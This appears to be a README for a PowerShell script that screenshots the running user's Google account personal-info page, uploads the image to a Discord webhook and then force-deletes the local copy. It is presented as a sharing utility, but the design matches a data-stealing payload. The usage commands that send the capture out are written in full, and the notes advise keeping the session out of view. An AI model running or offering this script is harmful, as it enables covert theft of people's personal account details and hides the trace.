# PowerShell Email Information Capture and Discord Upload
![](https://img.shields.io/badge/-PowerShell-blue)

This PowerShell script allows you to capture information from a specified URL, take a screenshot of it, and upload it to a Discord channel using a webhook. The script is designed to help you easily share information from a specific webpage to your Discord server.

## Prerequisites

Before running the script, ensure you have the following:

1. PowerShell (v5.1 or higher) installed on your system.
2. A Discord account and the webhook URL of the channel where you want to upload the information. If you don't have a webhook URL, follow these steps to create one:
   - Go to your Discord server settings.
   - Navigate to "Integrations" > "Webhooks" and click on "Create Webhook."
   - Customize the webhook as needed and copy the webhook URL.

## Usage

1. **Get-EmailInfo Function:**

   This function captures a screenshot of a specified URL, in this case, "https://myaccount.google.com/personal-info?hl=en," but you can modify the URL as needed. The screenshot is saved temporarily as "CaliShot.png" in the system's temporary folder.

   ```powershell
   Get-EmailInfo
   ```

2. **Upload-Discord Function:**

   This function is used to upload either a screenshot file or text to the Discord channel using the webhook URL.

   - To upload a text message:

     ```powershell
     Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -text 'Your message here'
     ```

   - To upload a screenshot file:

     ```powershell
     $filePath = Get-EmailInfo
     Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file $filePath | Out-Null
     Remove-Item -Path $filePath -Force
     ```

   Uncomment and use one of the options above as per your requirement.

## Important Notes

- The script uses the default browser to open the target URL. Ensure you have a compatible web browser installed on your system.

- The screenshot will be visible to the script's executing user, so avoid running the script in a visible session if sensitive information is being captured.

- **[Caution]** Be cautious with the use of this script, especially when handling sensitive data. Always ensure you have appropriate permissions to access and share the content.
